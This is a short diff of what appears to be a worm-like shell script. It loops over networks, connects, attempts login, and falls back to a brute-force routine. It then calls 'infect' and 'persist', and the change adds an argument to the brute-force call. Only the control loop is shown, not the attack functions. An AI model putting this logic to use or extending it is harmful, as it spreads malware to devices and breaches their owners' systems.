@@ -184,7 +184,7 @@ do
 	connect `echo $net | cut -d '"' -f 2`
 	#Login - if this fails, brute force then login, if that fails, bail out this one is a no-winner.
 	#TODO: Generate a blacklist and blacklist this device?
-	login || (bf && login || popstate && break)
+	login || (bf 75 && login || popstate && break)
 	infect
 	persist
 	popstate
